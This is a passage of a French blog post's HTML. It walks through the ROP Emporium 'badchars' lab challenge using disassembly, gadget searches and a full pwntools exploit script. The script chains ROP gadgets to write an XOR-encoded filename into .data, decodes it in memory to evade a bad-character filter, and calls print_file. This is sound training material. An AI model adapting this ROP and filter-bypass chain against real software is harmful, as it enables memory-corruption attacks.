</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009d1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">215</span><span style="color:#f92672">&gt;</span>:   mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>],rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009d5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">219</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009d9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">223</span><span style="color:#f92672">&gt;</span>:   cmp    rax,<span style="color:#ae81ff">0x3</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009dd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">227</span><span style="color:#f92672">&gt;</span>:   jbe    <span style="color:#ae81ff">0x7ffff7c009a4</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">+</span><span style="color:#ae81ff">170</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009df</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">229</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009e3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">233</span><span style="color:#f92672">&gt;</span>:   add    rax,<span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009e7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">237</span><span style="color:#f92672">&gt;</span>:   mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>],rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009eb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">241</span><span style="color:#f92672">&gt;</span>:   mov    rdx,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009ef</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">245</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009f3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">249</span><span style="color:#f92672">&gt;</span>:   cmp    rdx,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009f6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">252</span><span style="color:#f92672">&gt;</span>:   jb     <span style="color:#ae81ff">0x7ffff7c0099a</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">+</span><span style="color:#ae81ff">160</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009f8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">254</span><span style="color:#f92672">&gt;</span>:   lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xed</span>]        <span style="color:#75715e"># 0x7ffff7c00aec</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009ff</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">261</span><span style="color:#f92672">&gt;</span>:   call   <span style="color:#ae81ff">0x7ffff7c00780</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00a04</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">266</span><span style="color:#f92672">&gt;</span>:   nop
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00a05</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">267</span><span style="color:#f92672">&gt;</span>:   leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00a06</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">268</span><span style="color:#f92672">&gt;</span>:   ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>Notre padding va √™tre de <code>0x20+0x8</code> bytes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>readelf <span style="color:#f92672">-</span>S badchars
</span></span><span style="display:flex;"><span>There are <span style="color:#ae81ff">29</span> section headers, starting at offset <span style="color:#ae81ff">0x1980</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Section Headers:
</span></span><span style="display:flex;"><span>  [Nr] Name              Type             Address           Offset
</span></span><span style="display:flex;"><span>       Size              EntSize          Flags  Link  Info  Align
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span><span style="display:flex;"><span>  [<span style="color:#ae81ff">23</span>] <span style="color:#f92672">.</span>data             PROGBITS         <span style="color:#ae81ff">0000000000601028</span>  <span style="color:#ae81ff">00001028</span>
</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000010</span>  <span style="color:#ae81ff">0000000000000000</span>  WA       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span></code></pre></div><p><code>.data</code> est situ√© √† l&rsquo;adresse <code>0x00601028</code> et la section a le flag <code>W</code>, donc on peut √©crire dedans.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary badchars <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;: mov&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005e2</span> : mov byte ptr [rip <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x200a4f</span>], <span style="color:#ae81ff">1</span> ; pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400635</span> : mov dword ptr [rbp], esp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400610</span> : mov eax, <span style="color:#ae81ff">0</span> ; pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400602</span> : mov ebp, esp ; pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040057c</span> : mov edi, <span style="color:#ae81ff">0x601038</span> ; jmp rax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400634</span> : mov qword ptr [r13], r12 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400601</span> : mov rbp, rsp ; pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span></code></pre></div><p>On a un <code>mov qword ptr [r13], r12 ; ret</code> situ√© √† <code>0x00400634</code> qui va nous servir √† √©crire dans <code>.data</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary badchars <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;: pop&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069c</span> : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069e</span> : pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a0</span> : pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a2</span> : pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400604</span> : pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040057b</span> : pop rbp ; mov edi, <span style="color:#ae81ff">0x601038</span> ; jmp rax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069b</span> : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069f</span> : pop rbp ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400588</span> : pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a3</span> : pop rdi ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a1</span> : pop rsi ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069d</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span></code></pre></div><p>Avec √ßa, on a un <code>pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</code> situ√© √† <code>0x0040069b</code> qu&rsquo;on va utiliser avec le <code>mov</code>.</p>
<p>Tant qu&rsquo;√† faire, on peut aussi garder de c√¥t√© le <code>pop rdi ; ret</code> (<code>0x004006a3</code>) et le <code>pop r14 ; pop r15 ; ret</code> (<code>0x004006a0</code>).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary badchars <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;: xor&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400628</span> : xor byte ptr [r15], r14b ; ret
</span></span></code></pre></div><p>On met aussi ce <code>xor</code> de c√¥t√© puisqu&rsquo;il va nous servir √† un-XOR le string une fois en m√©moire.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non<span style="color:#f92672">-</span>debugging symbols:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004004d8</span>  _init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400500</span>  pwnme<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400510</span>  print_file<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400520</span>  _start
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400550</span>  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400560</span>  deregister_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400590</span>  register_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005d0</span>  __do_global_dtors_aux
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400600</span>  frame_dummy
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400607</span>  main
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400617</span>  usefulFunction
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400628</span>  usefulGadgets
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400640</span>  __libc_csu_init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006b0</span>  __libc_csu_fini
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006b4</span>  _fini
</span></span></code></pre></div><p><code>print_file()</code> est situ√©e √† <code>0x00400510</code></p>
<p>L&rsquo;id√©e va donc √™tre de:</p>
<ul>
<li>Mettre dans <code>.data</code> un string qui correspond √† &ldquo;flag.txt&rdquo; XOR√© avec une cl√© de 2</li>
<li>Ensuite, on va le un-XOR avec notre gadget <code>xor</code> une fois qu&rsquo;il est d√©j√† dans la m√©moire</li>
<li>Enfin, on appelle <code>print_file()</code> avec notre string en param√®tre</li>
</ul>
<p>Ceci va nous permettre de contourner le &ldquo;filtre&rdquo; puisque le string qu&rsquo;on va entrer dans l&rsquo;input ne contiendra aucun des badchars, c&rsquo;est seulement une fois en m√©moire qu&rsquo;ils seront appara√Ætront (magic)</p>
<h1 id="final-payload-4">
  Final Payload
  <a href="#final-payload-4" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p>Voici donc notre payload:</p>
<blockquote>
<p>Note: j&rsquo;ai d√ª ajouter 8 √† l&rsquo;adresse de <code>.data</code> sinon √ßa ne fonctionnait pas (l&rsquo;avant dernier caract√®re du string ne changeait pas)</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./badchars&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flag.txt&#34;</span>
</span></span><span style="display:flex;"><span>flaglist <span style="color:#f92672">=</span> list(flag)
</span></span><span style="display:flex;"><span>xored_flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On xor notre string</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">0</span>, len(flaglist)):
</span></span><span style="display:flex;"><span>    flaglist[i] <span style="color:#f92672">=</span> chr(ord(flaglist[i])<span style="color:#f92672">^</span><span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>    xored_flag <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(flaglist[i])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004004ee</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_r12_r13_r14_r15 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x0040069c</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pour √©viter des probl√®mes de type, on va prendre uniquement la valeur d√©cimale de .data</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pour une raison inconnue, j&#39;ai eu besoin d&#39;ajouter 8 √† l&#39;adresse du .data, sinon √ßa ne marchait pas</span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> <span style="color:#ae81ff">6295600</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mov_ptr_r13_r12 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400634</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_r14_r15 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004006a0</span>)
</span></span><span style="display:flex;"><span>xor_byte_ptr_r15_r14 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400628</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004006a3</span>)
</span></span><span style="display:flex;"><span>print_file <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400510</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On √©crit notre &#34;flag.txt&#34; XOR√© dans r12, l&#39;adresse de .data dans r13 puis on remplit les deux autres registres de null bytes</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met ensuite notre string dans l&#39;adresse vers laquelle pointe r13 (c√†d .data)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_r12_r13_r14_r15
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> str<span style="color:#f92672">.</span>encode(xored_flag)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(data)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> mov_ptr_r13_r12
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On fait l&#39;op√©ration suivante 8 fois car elle doit √™tre faite pour chaque caract√®re du string</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># (&#34;flag.txt&#34; = 8 bytes)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># On met 0x2 (c√†d la cl√© avec laquelle on a XOR notre string) dans r14</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Puis on met l&#39;adresse de data+i dans r15, car on va devoir un-xor caract√®re par caract√®re</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># On XOR ensuite le l&#39;adresse vers laquelle pointe r15 (.data+i) avec r14 (la cl√©)</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> pop_r14_r15
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(data<span style="color:#f92672">+</span>i)
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> xor_byte_ptr_r15_r14
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enfin, on met notre string un-XOR√© dans rdi, puis on appelle la fonction print_file()</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(data)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> print_file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;payload.txt&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(payload)
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>On peut tester le payload pour s&rsquo;assurer qu&rsquo;il fonctionne:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/215351100-c463126a-5839-44ef-a4c8-a94397eca44c.png" alt="2023-01-29-202357_1179x660_scrot"></p>
<p>Et il fonctionne ! gg !</p>
<h6 id="back-to-top">
  <a href="#"><em>back to top</em></a>
  <a href="#back-to-top" class="h-anchor" aria-hidden="true">#</a>
</h6>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >voir d&#39;autres posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
            
              <span class="button next">
                <a href="/post/php_type_juggling/">
                  <span class="button__text">üá¨üáß What is &#34;Type Juggling&#34; (PHP)</span>
                  <span class="button__icon">‚Üí</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    
      
        

      
    
  </article>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">rami malek en personne</div>
      
  </div>
</footer>





<script type="text/javascript" src="/bundle.min.js"></script>


      
    </div>

    
  </body>
</html>
